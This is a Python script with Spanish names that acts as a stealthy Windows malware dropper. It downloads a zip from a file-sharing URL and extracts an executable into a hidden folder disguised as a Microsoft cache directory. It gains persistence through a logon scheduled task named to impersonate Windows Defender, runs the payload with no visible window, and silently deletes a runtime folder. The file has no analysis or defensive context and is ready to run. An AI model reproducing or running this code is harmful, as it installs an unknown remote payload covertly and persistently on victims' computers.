import os
import subprocess
import urllib.request
import zipfile
import io
import tempfile
from pathlib import Path

URL_ZIP_PROGRAMA = "https://files.catbox.moe/bwvxei.zip"

DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
RUTA_EXE_1 = os.path.join(DIRECTORIO_DISCRETO, "update.exe")

def descargar_y_extraer_zip(url, directorio_destino):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        req = urllib.request.Request(url, headers=headers)
        
        with urllib.request.urlopen(req, timeout=30) as response:
            contenido_zip = response.read()
            
        ruta_temp_zip = os.path.join(tempfile.gettempdir(), "update_temp.zip")
        with open(ruta_temp_zip, 'wb') as f:
            f.write(contenido_zip)
            
        archivo_extraido = False
        with zipfile.ZipFile(ruta_temp_zip, 'r') as zf:
            for filename in zf.namelist():
                if filename.endswith('.exe'):
                    zf.extract(filename, directorio_destino)
                    
                    nombre_archivo_en_zip = os.path.basename(filename)
                    ruta_extraida_real = os.path.join(directorio_destino, nombre_archivo_en_zip)
                    
                    if nombre_archivo_en_zip != "update.exe":
                        ruta_final_deseada = os.path.join(directorio_destino, "update.exe")
                        if os.path.exists(ruta_final_deseada):
                            os.remove(ruta_final_deseada)
                        os.rename(ruta_extraida_real, ruta_final_deseada)
                        
                    archivo_extraido = True
                    break
                    
        if os.path.exists(ruta_temp_zip):
            os.remove(ruta_temp_zip)
            
        if archivo_extraido:
            subprocess.run(f'attrib +h "{RUTA_EXE_1}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        return False
    except Exception as e:
        return False

def configurar_tarea(nombre_tarea, ruta_exe):
    comando = (
        f'schtasks /create /sc ONLOGON /tn "{nombre_tarea}" '
        f'/tr "\"{ruta_exe}\"" /f'
    )
    try:
        subprocess.run(comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        return False

def ejecutar_oculto(ruta_exe):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen([ruta_exe], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass

if __name__ == "__main__":
    if not os.path.exists(DIRECTORIO_DISCRETO):
        os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
        subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if os.path.exists(RUTA_EXE_1):
        ejecutar_oculto(RUTA_EXE_1)
    else:
        if descargar_y_extraer_zip(URL_ZIP_PROGRAMA, DIRECTORIO_DISCRETO):
            configurar_tarea("WindowDefenderUpdateTask", RUTA_EXE_1)
            ejecutar_oculto(RUTA_EXE_1)

    try:
        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        subprocess.Popen(
            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
            shell=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
